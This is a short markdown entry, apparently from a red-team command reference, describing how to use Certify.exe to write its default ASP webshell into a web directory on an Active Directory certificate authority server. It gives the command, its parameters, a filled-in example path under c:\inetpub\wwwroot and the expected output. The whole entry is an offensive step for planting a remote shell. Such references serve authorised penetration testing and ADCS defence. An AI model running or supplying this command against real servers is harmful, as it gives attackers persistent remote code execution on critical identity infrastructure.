---
type: command
executor: powershell
data: 'Certify.exe writefile /ca:$_CA_NAME /path:$_PATH'
output: null
platforms:
  - Windows
tags:
  - adcs
  - rce
  - webshell
verified: true
validated: true
---

# certify-write-default-asp-shell-local

## Command

```powershell
Certify.exe writefile /ca:$_CA_NAME /path:$_PATH
```

## Description

Writes Certify's default ASP webshell to a local web directory on the CA server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /ca:$_CA_NAME | Target CA | Yes |
| /path:$_PATH | Destination path (e.g., c:\inetpub\wwwroot\shell.asp) | Yes |

## Examples

### Basic Usage

```powershell
Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp
```

## Expected Output

"Default shell written to path."

## Related

- [[procedures/Vulnerable-Certificate-Authority-Access-Control]]
